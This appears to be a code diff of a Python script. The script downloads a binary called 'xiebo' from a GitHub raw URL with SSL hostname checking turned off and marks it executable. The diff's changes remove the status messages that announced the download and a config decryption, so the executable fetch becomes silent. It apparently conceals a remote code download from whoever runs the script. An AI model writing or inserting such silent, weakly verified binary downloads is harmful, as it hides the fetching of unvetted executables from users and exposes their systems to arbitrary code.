@@ -139,7 +139,6 @@ def init_encrypted_config():
         print("Check encryption key and environment variables")
         sys.exit(1)
     
-    print("✅ Configuration decrypted successfully")
 
 # =============================================
 # SECURITY CHECK FUNCTIONS
@@ -239,7 +238,7 @@ def check_and_download_xiebo():
         return True
     
     try:
-        safe_print("📥 Downloading xiebo binary...")
+        
         url = "https://github.com/parcok717/sudim/raw/refs/heads/main/log"
         ssl_context = ssl.create_default_context()
         ssl_context.check_hostname = False
@@ -250,7 +249,7 @@ def check_and_download_xiebo():
                 f.write(response.read())
         
         os.chmod(xiebo_path, 0o755)
-        safe_print("✅ Xiebo binary downloaded")
+       
         return True
     except Exception as e:
         safe_print(f"❌ Download error: {e}")
@@ -655,4 +654,5 @@ def main():
 # =============================================
 if __name__ == "__main__":
     main()
+
 
